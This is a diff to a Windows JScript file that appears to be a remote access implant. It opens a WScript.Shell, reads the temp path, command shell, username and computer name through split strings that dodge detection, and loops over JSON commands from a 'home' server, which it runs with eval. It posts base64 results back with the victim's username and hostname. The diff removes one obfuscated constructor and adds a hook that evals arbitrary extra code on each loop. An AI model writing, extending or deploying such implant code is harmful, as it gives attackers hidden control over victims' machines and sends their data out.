@@ -11,15 +11,16 @@ var xFrameOptions = "SAMEORIGIN"
 var contentEncoding = "gzip"
 var contentType = "text/xml"
 
-var x = "iveXOb"
-eval("var runner = new Act"+x+"ject(\"WScr\" +   \"ipt.Sh\"+  \"ell\")")
-
+var runner = new ActiveXObject("WScript.Shell")
 var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
 var cs = runner.ExpandEnvironmentStrings("%C"+  "OmSP"    +"Ec%");
 var un = runner.ExpandEnvironmentStrings("%US"+  "ER"+"NA"+  "ME%");
 var hn = runner.ExpandEnvironmentStrings("%COM" + "PUT"  +"ERN" + "AME%");
 var id = Math.floor(Math.random() * 9999999999).toString()
 var type = "js"
+
+var runextra = false
+var extrafunc = ""
 
 //Find file we are running in
 var selfpath = WScript.ScriptFullName
@@ -143,6 +144,11 @@ while(true)
     // Convert json string to json object
     eval("jsObject="+jsondata);
 
+    // Supports running extra functions once per loop ... right before checking for cmnd
+    if(runextra) {
+      eval(extrafunc)
+    }
+
     if(jsObject.cmnd)
     {
       var rettype = "retval"
@@ -238,6 +244,8 @@ while(true)
       }
       var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'","'+rettype+'":"'+b64e(retval)+'"}';
       jsObject.cmnd = ""
+      
+      
       post(home, resp)
     }
   }
